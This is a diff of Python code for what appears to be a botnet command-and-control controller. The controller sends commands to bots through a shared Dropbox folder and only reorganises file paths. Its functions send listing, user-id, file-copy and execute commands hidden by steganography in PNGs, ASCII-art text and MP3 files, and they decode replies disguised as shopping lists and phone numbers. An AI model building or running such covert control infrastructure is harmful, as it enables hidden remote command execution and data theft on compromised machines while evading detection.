@@ -74,15 +74,15 @@ item_to_char_map = {item: char for char, item in username_chars_shopping_list.it
 def command_w(dropbox_session: DropboxSession, bot_number: int):
     global COUNTER
     # Get a random PDF file
-    pdf_file = get_nth_file("./pdfs", COUNTER % NUMBER_OF_FILES)
+    pdf_file = get_nth_file("./controller/pdfs", COUNTER % NUMBER_OF_FILES)
     # Upload the PDF file
-    dropbox_session.upload_file(f"./pdfs/{pdf_file}", f"{get_nth_bot_dir(bot_number)}/{pdf_file}")
+    dropbox_session.upload_file(f"./controller/pdfs/{pdf_file}", f"{get_nth_bot_dir(bot_number)}/{pdf_file}")
     # Wait for the response
     dropbox_session.wait_for_new_file(get_nth_bot_dir(bot_number))
     # Download the shopping list
-    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/shopping_list.txt', './temp/shopping_list.txt')
+    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/shopping_list.txt', './controller/temp/shopping_list.txt')
     # Read the contents of the shopping list
-    shopping_list_content = read_file_contents("./temp/shopping_list.txt")
+    shopping_list_content = read_file_contents("./controller/temp/shopping_list.txt")
     # Decode the shopping list
     usernames = decode_shopping_list_to_usernames(shopping_list_content, item_to_char_map)
     print(usernames)
@@ -94,17 +94,17 @@ def command_w(dropbox_session: DropboxSession, bot_number: int):
 def command_ls(dropbox_session: DropboxSession, bot_number: int, path: str):
     global COUNTER
     # Get a random png file
-    png_file = get_nth_file("./photos", COUNTER % NUMBER_OF_FILES)
+    png_file = get_nth_file("./controller/photos", COUNTER % NUMBER_OF_FILES)
     # Hide the path into a picture
-    lsb.hide(f'./photos/{png_file}', path).save('./temp/png_encoded.png')
+    lsb.hide(f'./controller/photos/{png_file}', path).save('./controller/temp/png_encoded.png')
     # Upload the picture
-    dropbox_session.upload_file('./temp/png_encoded.png', f'{get_nth_bot_dir(bot_number)}/{png_file}')
+    dropbox_session.upload_file('./controller/temp/png_encoded.png', f'{get_nth_bot_dir(bot_number)}/{png_file}')
     # Wait for the response
     dropbox_session.wait_for_new_file(get_nth_bot_dir(bot_number))
     # Download the response file
-    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/lion.png', './temp/lion_encoded.png')
+    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/lion.png', './controller/temp/lion_encoded.png')
     # Reveal the result of ls
-    response = lsb.reveal("./temp/lion_encoded.png")
+    response = lsb.reveal("./controller/temp/lion_encoded.png")
     # Delete the lion
     dropbox_session.delete_file(f'{get_nth_bot_dir(bot_number)}/lion.png')
     # Print the result
@@ -117,14 +117,14 @@ def command_ls(dropbox_session: DropboxSession, bot_number: int, path: str):
 def command_id(dropbox_session: DropboxSession, bot_number: int):
     global COUNTER
     # Upload a random docx file to indicate that id is requested
-    docx_file = get_nth_file("./docx", COUNTER % NUMBER_OF_FILES)
-    dropbox_session.upload_file(f"./docx/{docx_file}", f"{get_nth_bot_dir(bot_number)}/{docx_file}")
+    docx_file = get_nth_file("./controller/docx", COUNTER % NUMBER_OF_FILES)
+    dropbox_session.upload_file(f"./controller/docx/{docx_file}", f"{get_nth_bot_dir(bot_number)}/{docx_file}")
     # Wait for the response
     dropbox_session.wait_for_new_file(get_nth_bot_dir(bot_number))
     # Download the phone_numbers.txt
-    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/phone_numbers.txt', './temp/phone_numbers.txt')
+    dropbox_session.download_file(f'{get_nth_bot_dir(bot_number)}/phone_numbers.txt', './controller/temp/phone_numbers.txt')
     # Read the phone numbers file
-    phone_numbers = read_file_contents("./temp/phone_numbers.txt").split("\n")
+    phone_numbers = read_file_contents("./controller/temp/phone_numbers.txt").split("\n")
     # Decode the uid
     uid = decode_phone_number_to_uid(phone_numbers[68])
     # Print the result
@@ -133,21 +133,21 @@ def command_id(dropbox_session: DropboxSession, bot_number: int):
 
 def command_copy(dropbox_session: DropboxSession, bot_number: int, path: str):
     # Get a random mp3 file
-    mp3_file = get_nth_file("./mp3s", COUNTER % NUMBER_OF_FILES)
+    mp3_file = get_nth_file("./controller/mp3s", COUNTER % NUMBER_OF_FILES)
     # Concatenate the path to the file
-    concatenate_files_with_name(f"./mp3s/{mp3_file}", path, f'./temp/{mp3_file}')
+    concatenate_files_with_name(f"./controller/mp3s/{mp3_file}", path, f'./controller/temp/{mp3_file}')
     # Upload the concatenated mp3 file
-    dropbox_session.upload_file(f"./temp/{mp3_file}", f"{get_nth_bot_dir(bot_number)}/{mp3_file}")
+    dropbox_session.upload_file(f"./controller/temp/{mp3_file}", f"{get_nth_bot_dir(bot_number)}/{mp3_file}")
 
 
 # Sends
 def command_exec(dropbox_session: DropboxSession, bot_number: int, path: str):
     # Get a random text file
-    text_file = get_nth_file("./art", COUNTER % NUMBER_OF_FILES)
+    text_file = get_nth_file("./controller/art", COUNTER % NUMBER_OF_FILES)
     # Encode the path into an innocent looking message
-    hide_message_in_file(f"./art/{text_file}", "./temp/txt_hidden.txt", path)
+    hide_message_in_file(f"./controller/art/{text_file}", "./controller/temp/txt_hidden.txt", path)
     # Upload the file
-    dropbox_session.upload_file("./temp/txt_hidden.txt", f"{get_nth_bot_dir(bot_number)}/shrek_script_{len(path)}.txt")
+    dropbox_session.upload_file("./controller/temp/txt_hidden.txt", f"{get_nth_bot_dir(bot_number)}/shrek_script_{len(path)}.txt")
 
 
 def get_num_of_bots(dropbox_session: DropboxSession):
@@ -157,7 +157,7 @@ def get_num_of_bots(dropbox_session: DropboxSession):
     return count
 
 def serve():
-    delete_contents_of_folder("./temp")
+    delete_contents_of_folder("./controller/temp")
 
     DROPBOX_ACCESS_TOKEN = sys.argv[1]
     dropbox_session = DropboxSession(DROPBOX_ACCESS_TOKEN)
